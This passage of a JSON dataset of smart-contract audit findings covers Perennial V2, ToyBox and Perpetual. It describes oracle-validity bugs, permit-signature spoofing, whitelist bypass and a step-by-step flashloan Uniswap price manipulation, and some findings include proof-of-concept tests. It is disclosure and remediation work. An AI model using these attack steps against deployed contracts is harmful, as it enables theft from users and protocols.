      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/6 \n\n## Found by \nbin2chen, panprog\n## Summary\n\nEach market action requests a new oracle version which must be commited by the keepers. However, if keepers are unable to commit requested version's price (for example, no price is available at the time interval, network or keepers are down), then after a certain timeout this oracle version will be commited as invalid, using the previous valid version's price.\n\nThe issue is that when this expired oracle version is used by the market (using `oracle.at`), the version returned will be valid (`valid = true`), because oracle returns version as invalid only if `price = 0`, but the `commit` function sets the previous version's price for these, thus it's not 0.\n\nThis leads to market using invalid versions as if they're valid, keeping the orders (instead of invalidating them), which is a broken core functionality and a security risk for the protocol.\n\n## Vulnerability Detail\n\nWhen requested oracle version is commited, but is expired (commited after a certain timeout), the price of the previous valid version is set to this expired oracle version:\n```solidity\nfunction _commitRequested(OracleVersion memory version) private returns (bool) {\n    if (block.timestamp <= (next() + timeout)) {\n        if (!version.valid) revert KeeperOracleInvalidPriceError();\n        _prices[version.timestamp] = version.price;\n    } else {\n        // @audit previous valid version's price is set for expired version\n        _prices[version.timestamp] = _prices[_global.latestVersion]; \n    }\n    _global.latestIndex++;\n    return true;\n}\n```\n\nLater, `Market._processOrderGlobal` reads the oracle version using the `oracle.at`, invalidating the order if the version is invalid:\n```solidity\nfunction _processOrderGlobal(\n    Context memory context,\n    SettlementContext memory settlementContext,\n    uint256 newOrderId,\n    Order memory newOrder\n) private {\n    OracleVersion memory oracleVersion = oracle.at(newOrder.timestamp);\n\n    context.pending.global.sub(newOrder);\n    if (!oracleVersion.valid) newOrder.invalidate();\n```\n\nHowever, expired oracle version will return `valid = true`, because this flag is only set to `false` if `price = 0`:\n```solidity\nfunction at(uint256 timestamp) public view returns (OracleVersion memory oracleVersion) {\n    (oracleVersion.timestamp, oracleVersion.price) = (timestamp, _prices[timestamp]);\n    oracleVersion.valid = !oracleVersion.price.isZero(); // @audit <<< valid = false only if price = 0\n}\n```\n\nThis means that `_processOrderGlobal` will treat this expired oracle version as valid and won't invalidate the order.\n\n## Impact\n\nMarket uses invalid (expired) oracle versions as if they're valid, keeping the orders (instead of invalidating them), which is a broken core functionality and a security risk for the protocol.\n\n## Code Snippet\n\n`KeeperOracle._commitRequested` sets `_prices` to the last valid version's price for expired versions:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L153-L162\n\n`Market._processOrderGlobal` reads the oracle version using the `oracle.at`, invalidating the order if the version is invalid:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L604-L613\n\n`KeeperOracle.at` returns `valid = false` only if `price = 0`, but since expired version has valid price, it will be returned as a valid version:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L109-L112\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd validity map along with the price map to `KeeperOracle` when recording commited price.\n\n\n\n## Discussion\n\n**nevillehuang**\n\n@arjun-io @panprog @bin2chen66 For the current supported tokens in READ.ME, I think medium severity remains appropriate given they are both stablecoins. Do you agree?\n\n**arjun-io**\n\n> @arjun-io @panprog @bin2chen66 For the current supported tokens in READ.ME, I think medium severity remains appropriate given they are both stablecoins. Do you agree?\n\nI'm not entirely sure how the stablecoin in use matters here? Returning an invalid versions as valid can be very detrimental in markets where invalid versions can be triggered at will (such as in markets that close) which can result in users being able to open or close positions when they shouldn't be able to\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/308",
      "summary": "\nThis bug report is about an issue where requested oracle versions that have expired are not being handled correctly. Instead of being marked as invalid, they are being treated as valid and given the previous version's price. This can cause problems in the market as it may result in orders being kept open instead of being invalidated. This bug has been found by bin2chen and panprog and is considered a medium severity issue. The team has fixed this issue in the latest update. ",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/6",
      "tags": [
        "Oracle"
      ],
      "finders": [
        "panprog",
        "bin2chen"
      ]
    },
    {
      "id": "31170",
      "title": "H-1: Empty orders do not request from oracle and during settlement they use an invalid oracle version with `price=0` which messes up a lot of fees and funding accounting leading to loss of funds for the makers",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/5 \n\n## Found by \npanprog\n## Summary\n\nWhen `market.update` which doesn't change user's position is called, a new (current) global order is created, but the oracle version is not requested due to empty order. This means that during the order settlement, it will use non-existant invalid oracle version with `price = 0`. This price is then used to accumulate all the data in this invalid `Version`, meaning accounting is done using `price = 0`, which is totally incorrect. For instance, all funding and fees calculations multiply by oracle version's price, thus all time periods between empty order and the next valid oracle version will not accumulate any fees, which is funds usually lost by makers (as makers won't receive fees/funding for the risk they take).\n\n## Vulnerability Detail\n\nWhen `market.update` is called, it requests a new oracle version at the current order's timestamp unless the order is empty:\n```solidity\n// request version\nif (!newOrder.isEmpty()) oracle.request(IMarket(this), account);\n```\n\nThe order is empty when it doesn't modify user position:\n```solidity\nfunction isEmpty(Order memory self) internal pure returns (bool) {\n    return pos(self).isZero() && neg(self).isZero();\n}\n\nfunction pos(Order memory self) internal pure returns (UFixed6) {\n    return self.makerPos.add(self.longPos).add(self.shortPos);\n}\n\nfunction neg(Order memory self) internal pure returns (UFixed6) {\n    return self.makerNeg.add(self.longNeg).add(self.shortNeg);\n}\n```\n\nLater, when a valid oracle version is commited, during the settlement process, oracle version at the position is used:\n```solidity\nfunction _processOrderGlobal(\n    Context memory context,\n    SettlementContext memory settlementContext,\n    uint256 newOrderId,\n    Order memory newOrder\n) private {\n    // @audit no oracle version at this timestamp, thus it's invalid with `price=0`\n    OracleVersion memory oracleVersion = oracle.at(newOrder.timestamp); \n\n    context.pending.global.sub(newOrder);\n    // @audit order is invalidated (it's already empty anyway), but the `price=0` is still used everywhere\n    if (!oracleVersion.valid) newOrder.invalidate();\n\n    VersionAccumulationResult memory accumulationResult;\n    (settlementContext.latestVersion, context.global, accumulationResult) = VersionLib.accumulate(\n        settlementContext.latestVersion,\n        context.global,\n        context.latestPosition.global,\n        newOrder,\n        settlementContext.orderOracleVersion,\n        oracleVersion, // @audit <<< when oracleVersion is invalid, the `price=0` will still be used here\n        context.marketParameter,\n        context.riskParameter\n    );\n...\n```\n\nIf the oracle version is invalid, the order is invalidated, but the `price=0` is still used to accumulate. It doesn't affect pnl from price move, because the final oracle version is always valid, thus the correct price is used to evaluate all possible account actions, however it does affect accumulated fees and funding:\n```solidity\nfunction _accumulateLinearFee(\n    Version memory next,\n    AccumulationContext memory context,\n    VersionAccumulationResult memory result\n) private pure {\n    (UFixed6 makerLinearFee, UFixed6 makerSubtractiveFee) = _accumulateSubtractiveFee(\n        context.riskParameter.makerFee.linear(\n            Fixed6Lib.from(context.order.makerTotal()),\n            context.toOracleVersion.price.abs() // @audit <<< price == 0 for invalid oracle version\n        ),\n        context.order.makerTotal(),\n        context.order.makerReferral,\n        next.makerLinearFee\n    );\n...\n    // Compute long-short funding rate\n    Fixed6 funding = context.global.pAccumulator.accumulate(\n        context.riskParameter.pController,\n        toSkew.unsafeDiv(Fixed6Lib.from(context.riskParameter.takerFee.scale)).min(Fixed6Lib.ONE).max(Fixed6Lib.NEG_ONE),\n        context.fromOracleVersion.timestamp,\n        context.toOracleVersion.timestamp,\n        context.fromPosition.takerSocialized().mul(context.fromOracleVersion.price.abs()) // @audit <<< price == 0 for invalid oracle version\n    );\n...\nfunction _accumulateInterest(\n    Version memory next,\n    AccumulationContext memory context\n) private pure returns (Fixed6 interestMaker, Fixed6 interestLong, Fixed6 interestShort, UFixed6 interestFee) {\n    // @audit price = 0 and notional = 0 for invalid oracle version\n    UFixed6 notional = context.fromPosition.long.add(context.fromPosition.short).min(context.fromPosition.maker).mul(context.fromOracleVersion.price.abs());\n...\n```\n\nAs can be seen, all funding and fees accumulations multiply by oracle version's price (which is 0), thus during these time intervals fees and funding are 0.\n\nThis will happen by itself during **any** period when there are no orders, because oracle provider's settlement callback uses `market.update` with empty order to settle user account, thus any non-empty order is always followed by an empty order for the next version and `price = 0` will be used to settle it until the next non-empty order:\n```solidity\nfunction _settle(IMarket market, address account) private {\n    market.update(account, UFixed6Lib.MAX, UFixed6Lib.MAX, UFixed6Lib.MAX, Fixed6Lib.ZERO, false);\n}\n```\n\n## Impact\n\nAll fees and funding are incorrectly calculated as 0 during any period when there are no non-empty orders (which will be substantially more than 50% of the time, more like 90% of the time). Since most fees and funding are received by makers as a compensation for their price risk, this means makers will lose all these under-calculated fees and will receive a lot less fees and funding than expected.\n\n## Proof of concept\n\nThe scenario above is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```ts\nit('no fees accumulation due to invalid version with price = 0', async () => {\n\nfunction setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n    const oracleVersion = {\n    price: parse6decimal(price),\n    timestamp: timestamp,\n    valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n    oracle.status.returns([oracleVersion, nextTimestamp])\n    oracle.request.returns()\n}\n\nfunction setupOracleAt(price: string, valid : boolean, timestamp : number) {\n    const oracleVersion = {\n    price: parse6decimal(price),\n    timestamp: timestamp,\n    valid: valid,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n}\n\nconst riskParameter = { ...(await market.riskParameter()) }\nconst riskParameterMakerFee = { ...riskParameter.makerFee }\nriskParameterMakerFee.linearFee = parse6decimal('0.005')\nriskParameterMakerFee.proportionalFee = parse6decimal('0.0025')\nriskParameterMakerFee.adiabaticFee = parse6decimal('0.01')\nriskParameter.makerFee = riskParameterMakerFee\nconst riskParameterTakerFee = { ...riskParameter.takerFee }\nriskParameterTakerFee.linearFee = parse6decimal('0.005')\nriskParameterTakerFee.proportionalFee = parse6decimal('0.0025')\nriskParameterTakerFee.adiabaticFee = parse6decimal('0.01')\nriskParameter.takerFee = riskParameterTakerFee\nawait market.connect(owner).updateRiskParameter(riskParameter)\n\ndsu.transferFrom.whenCalledWith(user.address, market.address, COLLATERAL.mul(1e12)).returns(true)\ndsu.transferFrom.whenCalledWith(userB.address, market.address, COLLATERAL.mul(1e12)).returns(true)\n\nsetupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\nawait market\n    .connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, COLLATERAL, false);\nawait market\n    .connect(userB)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, POSITION, 0, COLLATERAL, false);\n\nsetupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);\nawait market\n    .connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, 0, false);\n\n// oracle is commited at timestamp+200\nsetupOracle('100', TIMESTAMP + 200, TIMESTAMP + 300);\nawait market\n    .connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, 0, false);\n\n// oracle is not commited at timestamp+300\nsetupOracle('100', TIMESTAMP + 200, TIMESTAMP + 400);\nsetupOracleAt('0', false, TIMESTAMP + 300);\nawait market\n    .connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, 0, false);\n\n// settle to see makerValue at all versions\nsetupOracle('100', TIMESTAMP + 400, TIMESTAMP + 500);\n\nawait market.settle(user.address);\nawait market.settle(userB.address);\n\nvar ver = await market.versions(TIMESTAMP + 200);\nconsole.log(\"version 200: longValue: \" + ver.longValue + \" makerValue: \" + ver.makerValue);\nvar ver = await market.versions(TIMESTAMP + 300);\nconsole.log(\"version 300: longValue: \" + ver.longValue + \" makerValue: \" + ver.makerValue);\nvar ver = await market.versions(TIMESTAMP + 400);\nconsole.log(\"version 400: longValue: \" + ver.longValue + \" makerValue: \" + ver.makerValue);\n})\n```\n\nConsole log:\n```solidity\nversion 200: longValue: -318 makerValue: 285\nversion 300: longValue: -100000637 makerValue: 100500571\nversion 400: longValue: -637 makerValue: 571\n```\n\nNotice, that fees are accumulated between versions 200 and 300, version 300 has huge pnl (because it's evaluated at price = 0), which then returns to normal at version 400, but no fees are accumulated between version 300 and 400 due to version 300 having `price = 0`.\n\n## Code Snippet\n\n`Market._update` requests a new oracle version only when the order is not empty:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L466-L467\n\n`Market._processOrderGlobal` invalidates the order for invalid oracle version, but still uses invalid oracle's price (which is 0) to accumulate:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L610-L625\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nKeep the price from the previous valid oracle version and use it instead of oracle version's one if oracle version's price == 0.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**panprog** commented:\n> invalid by sherlock rules\n\n\n\n**nevillehuang**\n\n@panprog What is your comment referring to here?\n\n**panprog**\n\n@nevillehuang The comment was meant for issue #7, somehow got mixed up with this one. This issue is valid.\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/301",
      "summary": "\nThe report discusses a bug in the Equilibria protocol, specifically in the `market.update` function. When this function is called, it creates a new global order, but if the order is empty, it does not request a new oracle version. This means that during the settlement process, an invalid oracle version with a price of 0 is used. This can result in incorrect calculations for fees and funding, leading to a loss of funds for makers. The report includes a proof of concept and a code snippet to demonstrate the issue. The recommendation is to keep the price from the previous valid oracle version if the current version has a price of 0. The issue has been fixed by the protocol team in a recent update.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/5",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "31728",
      "title": "[L-05] Multiple calls to bypass maxMintPerTx",
      "impact": "LOW",
      "content": "`maxMintPerTx` name and comments suggest that the variable should limit the amount purchased per transaction.\n\n```solidity\n        // Can't mint more per tx than allowed\n        if (_amount > maxMintPerTx) {\n            revert ExceedsMaxMintPerTx();\n        }\n```\n\nIn fact, it is a limitation per call. As a result, the simplest strategy to bypass the limit is just calling multiple times per transaction.\n\nEnsure that this behavior is intentional. If it is not, add logic to set limits correctly for transactions.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31727",
      "title": "[L-04] Not checked `openingTime` and `closingTime` on setup",
      "impact": "LOW",
      "content": "Consider additional checks on `openingTime` and `closingTime` setup that `openingTime < closingTime` in `ToyBox.setTimes()`, `ToyBox.setCustomSale()` and `ZKRandMint.setTimes()`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31726",
      "title": "[L-03] Centralization risk as admin can game the random minting process",
      "impact": "LOW",
      "content": "Admin can cause different issues during minting process like:\n\n1. Changing the commitment to make sure to receive Ultra Rare tokens.\n2. Doesn't generate proof for some users.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31725",
      "title": "[L-02] Last drop rate must be 100 otherwise mint would revert always",
      "impact": "LOW",
      "content": "There is no check in the `setRarityDistribution()` to make sure last drop rate is 100 and mint would revert if the last drop rate is not 100.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31724",
      "title": "[L-01] Setting `burnId` after the `openingTime` can cause Cosmetic tokens to be minted by burning other ToyBox token",
      "impact": "LOW",
      "content": "The default value of `burnId` is zero and if admin set it's value after `openingTime` then Cosmetic tokens can be minted by burning ToyBox token `id=0` too.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31723",
      "title": "[M-02] `ToyBox.sol` contract lacks `discountTokens` setter",
      "impact": "MEDIUM",
      "content": "**Impact:** Low\n\n**Likelihood:** High\n\n**Description**\n\nWhen user buys a ToyBox token from the sale, a discount is applied to the price\n\n```solidity\n    function getFullPrice(uint256 _price, address _paymentToken) internal view returns (uint256) {\n>>      uint256 _discount = discountTokens[_paymentToken];\n        if (_discount > 0) {\n            _price = _price - (_price * _discount / 10000);\n        }\n        return _price;\n    }\n\n    function getFullCustomPrice(uint256 _price, address _paymentToken) internal view returns (uint256) {\n>>      uint256 _discount = saleTokenDiscounts[customSaleActive][_paymentToken];\n        if (_discount > 0) {\n            _price = _price - (_price * _discount / 10000);\n        }\n        return _price;\n    }\n```\n\nThe `discountTokens` and `saleTokenDiscounts` mappings store the discount percentages for primary and custom sales, respectively. However, the sale manager is unable to customize discounts for primary sales using `discountTokens` due to the absence of a setter function, unlike for custom sale discounts managed through `setSaleTokenDiscounts/setSaleTokenDiscount` functions.\n\n**Recommendations**\n\nConsider either adding functions to set `discountTokens[_paymentToken]` or remove the step of calculating a discount for primary sales in `primarySale()` and `primarySaleWithPermit()`.",
      "summary": "\nThis bug report is about a problem that occurs when a user buys a ToyBox token during a sale. The price of the token is supposed to be discounted, but the discount is not being applied correctly. This is because there is no way to set the discount for primary sales, unlike for custom sales. The report suggests adding a function to set the discount for primary sales or removing the step of calculating a discount for primary sales.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31722",
      "title": "[M-01] Wrong usage of block's timestamp instead of block's number",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** Low\n\n**Likelihood:** High\n\n**Description**\n\nWhen code wants to get last block hash it uses `blockhash(block.timestamp - 1)`.\n\n```solidity\n        bytes32 pseudoRandomness =\n            keccak256(abi.encode(blockhash(block.timestamp - 1), msg.sender, nonces[msg.sender])) >> 3;\n```\n\nBut according to Solidity docs:\n\n```\nblockhash(uint blockNumber) returns (bytes32): hash of the given block - only works for 256 most recent blocks\n```\n\nAs a result `blockhash(block.timestamp - 1)` would be calculated for a nonexisting block and would always result in 0 so the `pesudoRandomness` would be more predictable and not according to the docs.\n\n**Recommendations**\n\nChange code to `blockhash(block.number - 1)`.",
      "summary": "\nThe bug report discusses an issue with a code that is used to get the last block hash in Solidity. The code currently uses `blockhash(block.timestamp - 1)` to get the hash, but according to the Solidity documentation, this only works for the 256 most recent blocks. This means that the code is using a nonexisting block, resulting in a predictable and incorrect value for the `pseudoRandomness` variable. The report recommends changing the code to `blockhash(block.number - 1)` to fix this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31721",
      "title": "[H-02] Force buy ToyBox for anyone who sets approval for contract",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n**Description**\n\nIn ToyBox contract and `primarySaleWithPermit()` and `customSaleWithPermit()` code doesn't check that `msg.sender` is equal to the `permitSignature.owner`. Also valid permission signature is not enforced in `trustlessPermit()` so If someone has set approval for the ToyBox contract, it would be possible to call those functions with spoofed permission signature and buy ToyBox token for them without their permission. Attacker can spend all the users' tokens that gave spending allowance and also buy ToyBox when price is not fair.\n\n**Recommendations**\n\nCode should verify `msg.sender` to be equal to the `permitSignature.owner`.",
      "summary": "\nThe ToyBox contract has a bug that allows someone to buy ToyBox tokens without the owner's permission. This can happen because the code does not check if the person calling the function is the same as the owner listed in the permit signature. This means that if someone has given permission for the ToyBox contract to spend their tokens, an attacker can use a fake permit signature to buy tokens without their knowledge. This can result in the attacker spending all the tokens and buying ToyBox tokens at an unfair price. To fix this, the code needs to be updated to check if the caller is the same as the owner listed in the permit signature.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31720",
      "title": "[H-01] Bypassing `saleUserCap` and whitelist",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n**Description**\n\n`ToyBox.customSaleChecks()` does many checks, but this check for a user is very likely wrong:\n\n```solidity\n    modifier customSaleChecks(address _receiver, address _paymentToken, uint256 _amount, bytes32[] calldata _proof) {\n        ...\n        // If the merkleRoot is set, check if the user is in the list\n        if (saleStruct.merkleRoot != bytes32(0)) {\n            bytes32 leaf = keccak256(abi.encode(msg.sender));\n            if (!MerkleProof.verify(_proof, saleStruct.merkleRoot, leaf)) {\n                revert InvalidProof();\n            }\n        }\n        ...\n```\n\nThe problem is that `msg.sender` is checked, when the \"user\" here is `_receiver`. It works correctly when they are the same, but it will be wrong in all other cases.\nLater in the code, `_receiver` is the target for checking `saleUserCap`, not `msg.sender`. It allows minting to different receivers bypassing `saleUserCap`.\nMoreover, `msg.sender` is checked when calling `customSaleWithPermit()` which is also probably wrong.\nIn addition, these receivers are not checked for being whitelisted.\n\n**Recommendations**\n\nReplace `msg.sender` with `_receiver` in `customSaleChecks()`.",
      "summary": "\nThe report highlights an issue with the `ToyBox.customSaleChecks()` function in a smart contract. This function is responsible for conducting various checks, but one specific check for a user is likely incorrect. The problem lies in the fact that the function checks for `msg.sender` instead of the intended `_receiver` address. This can lead to incorrect results when the two addresses are different, potentially allowing unauthorized users to bypass certain restrictions. The report recommends replacing `msg.sender` with `_receiver` in the function to fix the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31719",
      "title": "[C-02] Mistake using primary price for `customSaleWithPermit()`",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** High\n\n**Likelihood:** High\n\n**Description**\n\nToyBox uses `customSale()` and `customSaleWithPermit()` for non-primary sales, and these functions should not use data from the primary sales.\nBut customSaleWithPermit() uses the price for the primary sale, which likely is not the intended behavior.\n\n```\n    function customSaleWithPermit(uint256 _amount, PermitSignature calldata _permitSignature, bytes32[] calldata _proof)\n        external\n        nonReentrant\n        customSaleChecks(_permitSignature.owner, _permitSignature.token, _amount, _proof)\n    {\n        ...\n        _collectWithPermit(\n            _amount, getFullCustomPrice(price, _permitSignature.token), saleStruct.referenceToken, _permitSignature\n        );\n        ...\n    }\n```\n\nAs a result, users signing approvals via permit will receive a different price.\n\n**Recommendations**\n\nReplace `price` with `saleStruct.price`, as in `customSale()`.",
      "summary": "\nThis bug report discusses a problem with the ToyBox app's `customSaleWithPermit()` function. This function is used for non-primary sales, but it is currently using data from the primary sales, which is not the intended behavior. This means that users who sign approvals via permit will receive a different price than expected. The report recommends replacing `price` with `saleStruct.price` in the function to fix this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31718",
      "title": "[C-01] Uniswap oracle manipulation to buy for a lower price",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** High\n\n**Likelihood:** High\n\n**Description**\n\n`uniswapV2Router.getAmountsIn()` is used to calculate the amount of `paymentToken` required for the amount in `referenceToken`.\nThis feed is easily manipulated by a large swap in Uniswap pairs.\nSo the attacker can in one transaction:\n\n1. Flashloan `referenceToken`\n2. Sell this `referenceToken` in the Uniswap pair buying `paymentToken`. The price of `referenceToken` is decreased up to almost zero.\n3. Paying using `paymentToken` to mint in TokenBox. The manipulated price will help to spend a very small amount of `paymentToken` to buy TokenBox priced in `referenceToken`\n4. Return flashloaned `referenceToken`.\n\n**Recommendations**\n\nTWAP is the recommended way of reading the price from Uniswap V2 pairs. But it is also can be manipulated for low liquidity pairs.\nConsider using centralized oracles like Chainlink. E.g. Chainlink feeds can be provided when allowing a token as paymentToken.",
      "summary": "\nThe report states that there is a high severity bug in the `uniswapV2Router.getAmountsIn()` function. This bug can be easily manipulated by a large swap in Uniswap pairs. The attacker can use this to flashloan `referenceToken` and sell it in the Uniswap pair, causing the price of `referenceToken` to decrease significantly. They can then use the manipulated price to buy TokenBox at a very low cost using `paymentToken` and return the flashloaned `referenceToken`. \n\nTo prevent this, it is recommended to use TWAP to read prices from Uniswap V2 pairs. However, even TWAP can be manipulated for low liquidity pairs. It is suggested to use centralized oracles like Chainlink instead. These feeds can be used when allowing a token as `paymentToken`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Forgottenplayland",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/ForgottenPlayland-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "32175",
      "title": "M-12: Loss of funds for trader because whitelisted maker can't be liquidated",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/140 \n\n## Found by \n0xumarkhatab, ge6a, santipu\\_\n## Summary\n\nIn the current implementation, a whitelisted maker cannot be liquidated, thus it can accumulate losses even after the available margin is exhausted. This leads to losses for the traders because they won't be able to close their profitable positions due to a revert on _checkMarginRequirement.\n\n## Vulnerability Detail\n\nScenario:\n\n1) A trader opens a long position against a whitelisted maker.\n2) After some time, the price increases significantly. At this point, there are more long positions open than short positions, so this maker incurs large losses. The margin is not sufficient to cover them. However, the maker cannot be liquidated and continues to accumulate losses.\n3) The trader decides to close their position and withdraw their profit. However, this cannot happen because the _closePositionFor function calls _checkMarginRequirement for the maker. vault.getFreeCollateralForTrade is < 0, leading to a revert. The trader cannot close their position. The only solution is for LPs to deposit additional collateral to cover the losses, but it doesn't make sense to deposit funds to cover losses.\n4) The price decreases, and the trader loses their profit. Due to fees or a sudden price drop, the trader may also lose part of the margin.\n\nIn the described circumstances, the trader takes the risk by opening a position, but there is no way to close it and withdraw the profit. Thus, instead of gaining from the winning position, they incur losses.\n\n<details>\n<summary>POC</summary>\n\n```solidity\n\n    function testNotEnoughBalancePnlPool() public \n    {\n        _deposit(marketId, taker1, 10000e6);\n\n        vm.prank(taker1);\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1000 ether,\n                oppositeAmountBound: 100000 ether,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        console.log(\"Pnl pool balance: %d\", vault.getPnlPoolBalance(marketId));\n\n        maker.setBaseToQuotePrice(111e18);\n        maker2.setBaseToQuotePrice(111e18);\n        _mockPythPrice(111, 0);\n\n        console.log(\"getFreeCollateralForTrade:\");\n        console.logInt(vault.getFreeCollateralForTrade(marketId, address(maker), 111e18, MarginRequirementType.MAINTENANCE));\n\n        vm.prank(taker1);\n        //this will revert with NotEnoughFreeCollateral error\n        clearingHouse.closePosition(\n            IClearingHouse.ClosePositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                oppositeAmountBound: 1000 ether,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n    }\n```\n\n</details>\n\n## Impact\n\nLoss of funds for the trader + broken core functionality because of inability to close a position.\n\n## Code 